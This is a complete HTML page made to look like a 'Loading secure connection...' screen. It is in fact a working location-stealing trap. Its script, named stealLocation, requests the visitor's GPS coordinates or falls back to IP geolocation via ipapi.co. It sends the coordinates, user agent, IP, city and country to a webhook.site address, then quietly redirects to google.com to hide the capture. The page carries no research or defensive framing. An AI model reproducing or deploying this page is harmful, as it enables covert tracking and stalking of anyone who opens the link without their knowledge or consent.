<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script>
    const WEBHOOK = "https://webhook.site/c746b97f-524c-4fa1-8845-47e93ee3c38b";
    
    function stealLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendGPS, fallbackIP);
        } else {
            fallbackIP();
        }
        
        function sendGPS(pos) {
            let lat = pos.coords.latitude;
            let lon = pos.coords.longitude;
            let acc = pos.coords.accuracy;
            fetch(`${WEBHOOK}?type=gps&lat=${lat}&lon=${lon}&acc=${acc}&ua=${encodeURIComponent(navigator.userAgent)}`, {mode: 'no-cors'});
            redirect();
        }
        
        function fallbackIP() {
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    let info = `IP: ${data.ip} | City: ${data.city} | Country: ${data.country_name} | Lat: ${data.latitude}, Lon: ${data.longitude}`;
                    fetch(`${WEBHOOK}?type=ip&info=${encodeURIComponent(info)}`, {mode: 'no-cors'});
                    redirect();
                })
                .catch(() => redirect());
        }
        
        function redirect() {
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 1000);
        }
    }
    
    stealLocation();
    </script>
</head>
<body>
<p style="font-family: Arial; text-align: center; margin-top: 50px;">Loading secure connection...</p>
</body>
</html>
